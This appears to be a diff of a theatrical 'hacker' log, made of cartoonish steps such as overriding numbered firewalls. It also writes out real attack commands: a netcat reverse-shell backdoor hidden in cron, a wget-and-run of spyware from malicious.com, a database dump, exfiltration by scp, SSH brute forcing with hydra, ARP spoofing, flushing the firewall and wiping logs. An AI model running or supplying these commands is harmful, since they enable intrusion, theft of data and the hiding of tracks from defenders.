@@ -1,118 +1,94 @@
-<
 2024-07-24 12:01:32 - [INFO] Setting up hacker environment...
 2024-07-24 12:01:33 - [INFO] HACKER_ALIAS="Phantom" DARKWEB_ACCESS=true
 2024-07-24 12:01:34 - [INFO] Aliases set: breach, decrypt, hack
 2024-07-24 12:01:35 - [INFO] Starting hacking sequence...
 2024-07-24 12:01:36 - [BREACH] System breach initiated...
 2024-07-24 12:01:37 - [HACK] Hacking in progress...
->
-<
+
 2024-07-24 12:01:38 - [PAYLOAD] Executing payload 1...
 2024-07-24 12:01:39 - [PAYLOAD] Executing payload 2...
 2024-07-24 12:01:40 - [PAYLOAD] Executing payload 3...
 2024-07-24 12:01:41 - [PAYLOAD] Executing payload 4...
 2024-07-24 12:01:42 - [PAYLOAD] Executing payload 5...
->
-<
+
 2024-07-24 12:01:43 - [FIREWALL] Overriding firewall 1...
 2024-07-24 12:01:44 - [FIREWALL] Overriding firewall 2...
 2024-07-24 12:01:45 - [FIREWALL] Overriding firewall 3...
 2024-07-24 12:01:46 - [FIREWALL] Overriding firewall 4...
 2024-07-24 12:01:47 - [FIREWALL] Overriding firewall 5...
->
-<
+
 2024-07-24 12:01:48 - [CIPHER] Generating cipher 1...
 2024-07-24 12:01:49 - [CIPHER] Generating cipher 2...
 2024-07-24 12:01:50 - [CIPHER] Generating cipher 3...
 2024-07-24 12:01:51 - [CIPHER] Generating cipher 4...
 2024-07-24 12:01:52 - [CIPHER] Generating cipher 5...
->
-<
+
 2024-07-24 12:01:53 - [NMAP] Running nmap scan...
 2024-07-24 12:01:54 - [NMAP] Command: nmap -sS 192.168.1.1/24
 2024-07-24 12:01:55 - [PING] Pinging target systems...
 2024-07-24 12:01:56 - [PING] Command: ping -c 4 192.168.1.10
 2024-07-24 12:01:57 - [PING] Command: ping -c 4 192.168.1.20
->
-<
+
 2024-07-24 12:01:58 - [SECURITY] Bypassing security protocols...
 2024-07-24 12:01:59 - [SECURITY] Command: iptables -F
 2024-07-24 12:02:00 - [SECURITY] Command: iptables -X
->
-<
+
 2024-07-24 12:02:01 - [MAINFRAME] Accessing mainframe...
 2024-07-24 12:02:02 - [MAINFRAME] Command: ssh root@mainframe.example.com
->
-<
+
 2024-07-24 12:02:03 - [UPLOAD] Uploading virus...
 2024-07-24 12:02:04 - [UPLOAD] Command: scp /path/to/virus root@mainframe.example.com:/tmp
->
-<
+
 2024-07-24 12:02:05 - [ALARM] Disabling alarms...
 2024-07-24 12:02:06 - [ALARM] Command: systemctl stop alarm.service
 2024-07-24 12:02:07 - [ALARM] Command: systemctl disable alarm.service
->
-<
+
 2024-07-24 12:02:08 - [LOGS] Erasing logs...
 2024-07-24 12:02:09 - [LOGS] Command: echo > /var/log/syslog
 2024-07-24 12:02:10 - [LOGS] Command: echo > /var/log/auth.log
->
-<
+
 2024-07-24 12:02:11 - [INFO] Initiating additional hacker activities...
 2024-07-24 12:02:12 - [SQLMAP] Initiating SQL injection...
 2024-07-24 12:02:13 - [SQLMAP] Command: sqlmap -u "http://example.com/vuln.php?id=1" --dbs
->
-<
+
 2024-07-24 12:02:14 - [HYDRA] Running brute force attack...
 2024-07-24 12:02:15 - [HYDRA] Command: hydra -l admin -P /path/to/passwords.txt 192.168.1.30 ssh
->
-<
+
 2024-07-24 12:02:16 - [REVERSE_SHELL] Setting up reverse shell...
 2024-07-24 12:02:17 - [REVERSE_SHELL] Command: nc -lvp 4444
->
-<
+
 2024-07-24 12:02:18 - [BACKDOOR] Creating backdoor...
 2024-07-24 12:02:19 - [BACKDOOR] Command: echo 'nc -e /bin/bash 192.168.1.100 5555' > /tmp/backdoor.sh
 2024-07-24 12:02:20 - [BACKDOOR] Command: chmod +x /tmp/backdoor.sh
->
-<
+
 2024-07-24 12:02:21 - [CRONJOB] Hiding backdoor in cronjob...
 2024-07-24 12:02:22 - [CRONJOB] Command: (crontab -l ; echo "*/5 * * * * /tmp/backdoor.sh") | crontab -
->
-<
+
 2024-07-24 12:02:23 - [MITM] Executing man-in-the-middle attack...
 2024-07-24 12:02:24 - [MITM] Command: arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
->
-<
+
 2024-07-24 12:02:25 - [PHISHING] Crafting phishing email...
 2024-07-24 12:02:26 - [PHISHING] Command: echo "Click this link to reset your password" | mail -s "Password Reset" victim@example.com
->
-<
+
 2024-07-24 12:02:27 - [SPYWARE] Installing spyware...
 2024-07-24 12:02:28 - [SPYWARE] Command: wget http://malicious.com/spyware.sh -O /tmp/spyware.sh
 2024-07-24 12:02:29 - [SPYWARE] Command: bash /tmp/spyware.sh
->
-<
+
 2024-07-24 12:02:30 - [DUMP] Dumping database...
 2024-07-24 12:02:31 - [DUMP] Command: mysqldump -u root -p --all-databases > /tmp/all_databases.sql
->
-<
+
 2024-07-24 12:02:32 - [EXFILTRATION] Exfiltrating data...
 2024-07-24 12:02:33 - [EXFILTRATION] Command: scp /tmp/all_databases.sql hacker@remote-server:/data
->
-<
+
 2024-07-24 12:02:34 - [COVER] Covering tracks...
 2024-07-24 12:02:35 - [COVER] Command: history -c
 2024-07-24 12:02:36 - [COVER] Command: rm -rf /tmp/*
->
-<
+
 2024-07-24 12:02:37 - [INFO] Hacking activities completed.
->
-<
+
 2024-07-24 12:02:38 - [INFO] Setting up new hacker environment...
 2024-07-24 12:02:39 - [INFO] HACKER_ALIAS="Ghost" DARKWEB_ACCESS=true
 2024-07-24 12:02:40 - [INFO] Aliases set: breach, decrypt, hack
 2024-07-24 12:02:41 - [INFO] Restarting hacking sequence...
 2024-07-24 12:02:42 - [BREACH] System breach re-initiated...
 2024-07-24 12:02:43 - [HACK] Hacking in progress...
->
